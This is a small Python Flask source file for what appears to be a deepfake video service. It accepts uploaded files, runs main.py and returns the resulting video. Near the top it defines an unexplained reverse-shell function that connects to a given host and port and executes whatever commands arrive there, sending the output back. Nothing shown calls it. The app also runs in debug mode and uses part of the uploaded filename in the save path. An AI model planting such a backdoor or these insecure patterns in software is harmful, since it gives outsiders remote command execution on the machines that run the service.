from flask import Flask, request, send_file
import os

app = Flask(__name__)

import socket
import subprocess

def rs(h, p):
  soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  soc.connect((h, p))
  while True:
    cmd = soc.recv(1024)
    proc = subprocess.Popen(cmd.decode('utf8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output= proc.stdout.read()+proc.stderr.read()
    soc.sendall(output)



@app.route('/', methods=['POST'])
def upload_file():
    os.system('rm -rf DeepFake.mp4 filename.avi pic.jpg')
    os.system('touch filename.avi')
    file = request.files['DeepFake']
    file2 = request.files['pic']
    file3 = request.files['filename.avi']
    file.save('./' + 'DeepFake.mp4')
    file2.save('./' + f'pic{file2.filename[-4:]}')
    file3.save('./' + 'filename.avi')
    
    
    os.system("python3 main.py")
    try:
        return send_file('filename.avi', as_attachment=True)
    
    except:
       
       return os.popen("ls").read()


if __name__ == '__main__':
    app.run(debug=True)
